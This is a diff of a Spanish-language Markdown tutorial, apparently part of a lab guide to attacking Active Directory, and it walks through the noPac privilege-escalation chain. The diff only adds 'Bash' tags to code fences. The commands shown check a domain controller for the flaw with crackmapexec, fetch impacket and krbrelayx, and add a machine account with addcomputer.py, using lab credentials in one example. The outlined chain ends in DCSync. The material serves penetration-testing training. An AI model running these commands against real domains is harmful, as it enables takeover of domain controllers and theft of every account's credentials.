@@ -3,14 +3,14 @@
 Para este ataque se va a añadir un ordenador, borrar el SPN de ese ordenador, renombrar el ordenador con el mismo nombre que el DC, obtener un TGT para ese ordenador, restablecer el nombre del ordenador a su nombre original, obtener un ticket de servicio con el TGT que obtuvimos anteriormente y finalmente dcsync :)
 
 
-```
+```Bash
 # Comprobamos que el equipo es vulnerable a nopac
 poetry run crackmapexec smb <ip del DC> -u <user> -p <pass> -M nopac
 ```
 
 ![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/vid.gif?raw=true "Check NoPac")
 
-```
+```Bash
 # Necesitamos una versión específica de impacket para los scripts renameMachine.py y getST.py
 git clone https://github.com/SecureAuthCorp/impacket myimpacket
 cd myimpacket
@@ -24,7 +24,7 @@ git clone https://github.com/dirkjanm/krbrelayx
 
 ![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/vid2.gif?raw=true "Descargando herramientas necesarias")
 
-```
+```Bash
 # Añadimos un nuevo equipo
 #~ python addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/arya.stark:Needle'
 python addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host <nombre completo del DC en el dominio> -domain-netbios <dominio> '<dominio>/<user>:<pass>'
